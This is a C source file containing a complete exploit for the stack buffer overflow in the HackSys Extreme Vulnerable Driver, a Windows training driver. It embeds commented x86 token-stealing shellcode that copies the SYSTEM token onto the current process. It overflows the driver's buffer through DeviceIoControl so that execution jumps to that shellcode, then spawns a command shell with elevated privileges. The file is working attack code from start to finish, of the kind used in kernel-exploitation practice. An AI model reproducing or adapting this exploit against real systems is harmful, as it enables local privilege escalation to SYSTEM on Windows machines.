#include <windows.h>
#include <stdio.h>


int wmain(int argc, wchar_t* argv[])
{
	LPVOID lpvPayload;
	HANDLE hDevice;
	LPCWSTR lpDeviceName = L"\\\\.\\HacksysExtremeVulnerableDriver";
	BOOL bResult = FALSE;

	CHAR ShellCode[] = "\x60"		// pushad										; Save register state on the Stack
		"\x64\xA1\x24\x01\x00\x00"	// mov eax, fs:[KTHREAD_OFFSET]			; nt!_KPCR.PcrbData.CurrentThread
		"\x8B\x40\x50"			// mov eax, [eax + EPROCESS_OFFSET]		; nt!_KTHREAD.ApcState.Process
		"\x89\xC1"			// mov ecx, eax (Current _EPROCESS structure)	
		"\x8B\x98\xF8\x00\x00\x00"	// mov ebx, [eax + TOKEN_OFFSET]		; nt!_EPROCESS.Token
		//---[Copy System PID token]
		"\xBA\x04\x00\x00\x00"		// mov edx, 4 (SYSTEM PID)			; PID 4 -> System
		"\x8B\x80\xB8\x00\x00\x00"	// mov eax, [eax + FLINK_OFFSET] <-|		; nt!_EPROCESS.ActiveProcessLinks.Flink
		"\x2D\xB8\x00\x00\x00"		// sub eax, FLINK_OFFSET           |
		"\x39\x90\xB4\x00\x00\x00"	// cmp [eax + PID_OFFSET], edx     |		; nt!_EPROCESS.UniqueProcessId
		"\x75\xED"			// jnz				 ->|		; Loop !(PID=4)
		"\x8B\x90\xF8\x00\x00\x00"	// mov edx, [eax + TOKEN_OFFSET]		; System nt!_EPROCESS.Token
		"\x89\x91\xF8\x00\x00\x00"	// mov [ecx + TOKEN_OFFSET], edx		; Replace Current Process token
		//---[Recover]
		"\x61"				// popad										; Restore register state from the Stack
		"\x31\xC0"			// NTSTATUS -> STATUS_SUCCESS :p
		"\x5D"				// pop ebp
		"\xC2\x08\x00"			// ret 8
	;

	wprintf(L"    __ __         __    ____       	\n");
	wprintf(L"   / // /__ _____/ /__ / __/_ _____	\n");
	wprintf(L"  / _  / _ `/ __/  '_/_\\ \\/ // (_-<	\n");
	wprintf(L" /_//_/\\_,_/\\__/_/\\_\\/___/\\_, /___/	\n");
	wprintf(L"                         /___/     	\n");
	wprintf(L"					\n");
	wprintf(L"	 Extreme Vulnerable Driver  \n");
	wprintf(L"		Stack Overflow	\n\n");

	wprintf(L" [*] Allocating Ring0 Payload");
	
	lpvPayload = VirtualAlloc(
		NULL,				// Next page to commit
		sizeof(ShellCode),		// Page size, in bytes
		MEM_COMMIT | MEM_RESERVE,	// Allocate a committed page
		PAGE_EXECUTE_READWRITE);	// Read/write access
	if (lpvPayload == NULL)
	{
		wprintf(L" -> Unable to reserve Memory!\n\n");
		exit(1);
	}

	wprintf(L" -> Done!\n");

	memcpy(lpvPayload, ShellCode, sizeof(ShellCode));

	wprintf(L" [+] Ring0 Payload available at: 0x%p \n", lpvPayload);
	wprintf(L"\n [*] Trying to get a handle to the following Driver: %ls", lpDeviceName);

	hDevice = CreateFile(lpDeviceName,			// Name of the write
		GENERIC_READ | GENERIC_WRITE,			// Open for reading/writing
		FILE_SHARE_WRITE,				// Allow Share
		NULL,						// Default security
		OPEN_EXISTING,					// Opens a file or device, only if it exists.
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,	// Normal file
		NULL);						// No attr. template

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		wprintf(L" -> Unable to get Driver handle!\n\n");
		exit(1);
	}

	wprintf(L" -> Done!\n");
	wprintf(L" [+] Our Device Handle: 0x%p \n\n", hDevice);

	wprintf(L" [*] Lets send some Bytes to our Driver");

	CHAR *chBuffer;
	chBuffer = (CHAR *)malloc(2084);
	memset(chBuffer, 0x41, 2048);
	memset(chBuffer +2048, 0x42, 32);
	memcpy(chBuffer +2080, &lpvPayload, 4);
	
	// DoS PoC
	//memset(chBuffer + 2080, 0x44, 4);

	DWORD junk = 0;                    	// Discard results

	bResult = DeviceIoControl(hDevice,	// Device to be queried
		0x222003,			// Operation to perform
		chBuffer, 2084,			// Input Buffer
		NULL, 0,			// Output Buffer
		&junk,				// # Bytes returned
		(LPOVERLAPPED)NULL);		// Synchronous I/O	
	if (!bResult) {
		wprintf(L" -> Failed to send Data!\n\n");
		CloseHandle(hDevice);
		exit(1);
	}

	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

	wprintf(L" -> Done!\n\n");

	CloseHandle(hDevice);

}
